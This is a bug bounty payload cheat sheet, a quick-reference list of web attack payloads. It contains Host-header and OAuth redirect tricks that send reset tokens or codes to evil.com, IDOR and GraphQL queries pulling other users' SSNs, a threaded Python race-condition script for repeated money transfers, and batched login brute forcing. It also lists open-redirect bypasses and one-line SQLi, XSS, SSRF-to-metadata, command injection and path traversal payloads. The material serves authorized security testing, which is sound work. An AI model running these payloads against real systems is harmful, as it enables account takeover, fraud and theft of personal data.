# 08 — Bug Bounty: Payloads

> Quick-reference payloads optimized for bug bounty hunting scenarios.

---

## 🔴 High-Value Bug Bounty Payloads

### Account Takeover Payloads

```http
# Password reset → Host header poisoning
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email": "victim@target.com"}
# If reset link uses Host header: https://evil.com/reset?token=abc123

# Also try:
Host: target.com
X-Forwarded-Host: evil.com
X-Host: evil.com

# OAuth redirect_uri manipulation
GET /oauth/authorize?client_id=xxx&redirect_uri=https://evil.com/callback&response_type=code
GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com.evil.com/callback
GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback/../../../evil.com
```

### IDOR Payloads

```
# Sequential IDs
/api/users/1
/api/users/2
/api/users/3

# UUID manipulation
/api/users/550e8400-e29b-41d4-a716-446655440000
# Try: Replacing last digits, using UUIDs from other endpoints

# Method-based IDOR
GET /api/users/other_user_id          # Might be blocked
PUT /api/users/other_user_id          # Might work
DELETE /api/users/other_user_id       # Might work

# Parameter pollution
/api/users?id=my_id&id=other_id
/api/users?id[]=my_id&id[]=other_id

# Encoded IDs
/api/users/BASE64_ENCODED_ID
/api/users/HASHED_ID
```

### Race Condition Payloads

```python
# Send multiple requests simultaneously to exploit TOCTOU bugs
import requests
import threading

url = "https://target.com/api/transfer"
headers = {"Authorization": "Bearer TOKEN"}
data = {"amount": 1000, "to": "attacker_account"}

def send():
    requests.post(url, json=data, headers=headers)

# Send 20 requests simultaneously
threads = [threading.Thread(target=send) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Use cases:
# - Transfer money multiple times from one balance
# - Apply discount code multiple times
# - Create resource with same unique constraint
# - Vote/like multiple times
```

### GraphQL Payloads

```json
// Introspection query (discover schema)
{"query": "{__schema{types{name fields{name type{name}}}}}"}

// Full introspection
{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

// Batch queries (bypass rate limiting)
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
]

// IDOR via GraphQL
{"query": "{ user(id: 1) { email phone ssn } }"}
{"query": "{ user(id: 2) { email phone ssn } }"}

// Injection in GraphQL
{"query": "{ user(name: \"admin' OR 1=1--\") { id email } }"}
```

### Open Redirect Payloads

```
# Basic
/redirect?url=https://evil.com
/redirect?url=//evil.com
/redirect?url=/\evil.com

# Bypass schemes
/redirect?url=https://evil.com
/redirect?url=//evil.com
/redirect?url=////evil.com
/redirect?url=https:///evil.com

# With allowed domain
/redirect?url=https://evil.com?target.com
/redirect?url=https://target.com@evil.com
/redirect?url=https://target.com.evil.com
/redirect?url=https://evil.com#target.com
/redirect?url=https://evil.com\.target.com

# Encoded
/redirect?url=https%3A%2F%2Fevil.com
/redirect?url=%2F%2Fevil.com
/redirect?url=%252F%252Fevil.com  # Double encode
```

### Subdomain Takeover Indicators

```
# CNAME pointing to services that can be claimed:
# GitHub Pages:  "There isn't a GitHub Pages site here"
# Heroku:        "No such app"
# AWS S3:        "NoSuchBucket"
# Shopify:       "Sorry, this shop is currently unavailable"
# Tumblr:        "Whatever you were looking for doesn't currently exist"
# WordPress.com: "Do you want to register"
# Fastly:        "Fastly error: unknown domain"
# Pantheon:      "404 error unknown site"
# Zendesk:       "Help Center Closed"
# Azure:         "404 Web Site not found"

# Check: dig CNAME subdomain.target.com
# If CNAME exists but service returns error → potential takeover
```

---

## 🔴 Bug Bounty Quick Payloads Cheatsheet

```
SQLi:        ' OR 1=1-- -
XSS:         <img src=x onerror=alert(document.domain)>
SSRF:        http://169.254.169.254/latest/meta-data/
SSTI:        {{7*7}}
CMDi:        ; id
Path:        ../../etc/passwd
IDOR:        Change ID in URL/body with different user's session
CORS:        Origin: https://evil.com (check Access-Control-Allow-Origin)
CRLF:        %0d%0aInjected-Header: value
Open Redir:  ?url=//evil.com
JWT None:    Change alg to "none", remove signature
```

---

## 📋 Payload Testing Checklist

```
For each endpoint:
□ IDOR (change resource IDs)
□ SQL injection (single quote, UNION, SLEEP)
□ XSS (reflected, stored)
□ SSRF (if URL parameter exists)
□ Authentication bypass
□ CORS misconfiguration
□ Rate limiting (brute force)
□ Mass assignment (extra parameters)
□ Business logic (price manipulation, skip steps)
□ Race conditions (parallel requests)
□ GraphQL introspection (if GraphQL)
□ Open redirect (if redirect parameter)
□ CSRF (if state-changing without token)
```
